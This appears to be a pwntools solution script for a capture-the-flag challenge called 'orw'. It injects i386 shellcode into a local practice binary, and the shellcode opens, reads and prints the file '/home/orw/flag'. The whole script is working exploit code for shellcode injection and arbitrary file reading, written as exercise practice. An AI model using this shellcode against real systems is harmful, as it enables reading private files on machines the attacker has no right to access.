from pwn import *

context.arch = "i386"
# context.log_level = "DEBUG"

p = process("./orw")

# read - 3
# write - 4
# open - 5

shellcode = asm("""

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f

sub esp, 0x50

mov eax, 0x5
mov ebx, esp
add ebx, 0x50

int 0x80


mov ebx, eax

mov eax, 0x3
mov ecx, esp
mov edx, 0x50
int 0x80

mov eax, 0x4
mov ebx, 1
mov ecx, esp
mov edx, 0x50
int 0x80


mov eax, 1
mov ebx, 0
int 0x80

add esp, 0x50
add esp, 0x10
""")


p.sendlineafter(":", shellcode)

p.interactive()
